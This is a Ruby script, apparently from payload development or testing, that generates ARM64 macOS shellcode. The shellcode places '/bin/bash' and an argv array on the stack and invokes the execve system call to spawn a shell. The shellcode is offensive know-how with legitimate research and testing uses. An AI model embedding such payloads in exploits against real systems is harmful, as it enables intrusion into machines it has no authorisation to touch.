class Payload
  def align_to_16_bytes(value, required_byte_alignment: 16)
    return value if value % required_byte_alignment == 0

    value + (required_byte_alignment - (value % required_byte_alignment))
  end

  def hex(val)
    val.to_s(16).rjust(2, '0')
  end

  def register_byte_size
    8
  end

  def required_bytes_for_argv_pointers
    register_byte_size * 2
  end

  def write_program_name_and_argv_pointers(bytes)
    asm = []

    required_stack_size = align_to_16_bytes(bytes.length + required_bytes_for_argv_pointers)
    if required_stack_size >= 256
      # Not supported as the syntax 'str x1, [sp, #-#{sp_offset}]' would fail, as the relative index must be an integer in range [-256, 255].
      raise NotImplementedError, "Byte length #{bytes.length} too large and cannot be encoded"
    end

    stack_pointer_offset = required_stack_size

      # Program name, argv
    bytes.each_slice(register_byte_size) do |slice|
      # Padding
      slice += [0] * (register_byte_size - slice.length)
      asm << "# Starting bytes: #{slice.inspect} (#{slice.map(&:chr).join})"

      asm << "mov x5, #0x#{hex(slice[1])}#{hex(slice[0])}"
      asm << "movk x5, #0x#{hex(slice[3])}#{hex(slice[2])}, lsl #16"
      asm << "movk x5, #0x#{hex(slice[5])}#{hex(slice[4])}, lsl #32"
      asm << "movk x5, #0x#{hex(slice[7])}#{hex(slice[6])}, lsl #48"

      asm << "str x5, [sp, #-#{stack_pointer_offset}]"
      stack_pointer_offset -= register_byte_size
    end

    # Argv pointers
    asm << "// argv pointers"
    asm << "mov x5, sp"
    asm << "sub x5, x5, ##{required_stack_size} // program name base pointer"
    asm << "stp x5, xzr, [sp, #-#{required_bytes_for_argv_pointers}] // Store program name pointer followed by xzr, i.e. char *argv[] = { \"/bin/bash\", NULL };"

    asm
  end

  def datastore
    datastore = { 'CMD' => '/bin/bash' }
    # datastore = { 'CMD' => '/Users/jenkins/testing/test' }
    datastore
  end

  def generate
    asm = []
    # enc = ''.b
    # enc << "".b

    puts asm.join("\n")

    # Uses
    program = datastore['CMD']
    bytes = program.bytes

    # Write the bytes to the stack below the current sp location
    bytes = "#{program.b}\x00".bytes
    asm << '// write execve arguments on the stack, i.e. program name / argv'
    asm += write_program_name_and_argv_pointers(bytes)

    asm << '// syscall'
    asm << 'ldr x16, =0x200003b  // Load sys number for SYS_EXECVE'
    asm << 'mov x0, sp           // Arg0: char* path - Pointer to the current stack position'
    asm << "sub x0, x0, ##{align_to_16_bytes(bytes.length + required_bytes_for_argv_pointers)}  // subtract to the base of the program name"
    asm << "mov x1, sp          // Arg1: char *const argv[] - program name pointer for now"
    asm << "sub x1, x1, ##{required_bytes_for_argv_pointers}"
    asm << "mov x2, xzr         // Arg2: char *const envp[] - NULL for now"
    asm << 'svc #0              // Supervisor call - i.e. the system call'

    # asm << 'ldr x16, =0x2000004  // Load sys number for SYS_WRITE'
    # asm << 'mov x0, 0            // Arg0: stdout file descriptor'
    # asm << 'mov x1, sp           // Arg1: Pointer to the current stack position, will be the base of the written program name string'
    # asm << "sub x1, x1, #{align_to_16_bytes(bytes.length)}        // Arg1: Point to the start of the string"
    # asm << "mov x2, ##{bytes.length}           // Arg2: The size of the message in bytes"
    # asm << 'svc #0               // Supervisor call - i.e. the system call'
  end
end

puts Payload.new.generate.join("\n")
